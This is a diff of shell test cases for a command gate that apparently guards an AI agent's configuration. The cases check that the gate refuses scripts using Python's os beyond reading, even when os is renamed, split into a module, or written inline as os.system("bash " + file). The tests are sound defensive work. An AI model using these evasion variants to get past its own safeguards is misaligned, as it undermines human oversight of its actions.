+says "#3085 the refusal names the use of os that is more than reading" "uses os for more than reading files, paths and the environment (os.system)"
+run_85 "python3 os-alias.py $RULES"
+says "#3085 and os handed on under another name" "uses os for more than reading files, paths and the environment (os, handed on or renamed)"
+run_85 "python3 os-remove.py $RULES"
+says "#3085 and a removal, which is a write" "(os.remove)"
+run_85 "python3 os-via.py $RULES"
+says "#3085 and a module beside the script that starts a program" "lib_runner.py"
+run_85 "python3 -c 'import os, sys; os.system(\"bash \" + sys.argv[1])' $RULES"
+read_refused "#3085 code given inline that starts a program through os, handed the real rules file, is still refused"
+# Code a shell script writes inline keeps the wider list it had (OS_FILES, claude-config#2446), where
+# writing a file is not counted: os.remove passes there and os.system does not, as before.
+cat > "$D85/inline-remove.sh" <<'SH'
+#!/bin/bash
+python3 - "$1" <<'PY'
+import os, sys
+print(len(open(sys.argv[1]).read()))
+os.remove("/tmp/scratch-3085.txt")
+PY
+SH
+cat > "$D85/inline-system.sh" <<'SH'
+#!/bin/bash
+python3 - "$1" <<'PY'
+import os, sys
+os.system("bash " + sys.argv[1])
+PY
+SH
+run_85 "bash inline-remove.sh $RULES"
+allowed "#3085 code a shell script writes inline may still remove a file through os, as before"
+run_85 "bash inline-system.sh $RULES"
+read_refused "#3085 and still may not start a program through it"
+says "#3085 in the words that refusal had before" "uses os for more than its file, path and environment calls"
+# What the gate cannot follow is still refused, which is the other half of Dan's rule: a shell
+# script whose loop reads the file it is handed, and asks a library it sources about each line
+# (the push gates builder's measuring script, 2026-11-16, refused over a file of command texts
+# naming an endpoint). The loop's reads, and what a sourced library's functions do with what they
+# are handed, are two things the gate does not read, so this is not one it has read end to end.
+printf '%s\n' 'is_push() { grep -Eq "git push" <<< "$1"; }' > "$D85/questions.sh"
+printf '%s\n' 'curl -s https://slack.com/api/chat.postMessage -d text=hi' 'git push origin main' > "$D85/commands.txt"
+cat > "$D85/routes.sh" <<SH
+#!/usr/bin/env bash
+set -u
+IN="\$1"
+. $D85/questions.sh || exit 2
+count=0
+while IFS= read -r cmd; do
+  is_push "\$cmd" && count=\$((count + 1))
+done < "\$IN"
+echo "pushes: \$count"
+SH
+run_85 "bash routes.sh commands.txt"
+read_refused "#3085 a shell script whose loop reads the file it is handed is still refused: the gate does not follow the loop"
+says "#3085 and the refusal says that is why" "a loop or block whose reads the gate does not follow"
 
 echo
 
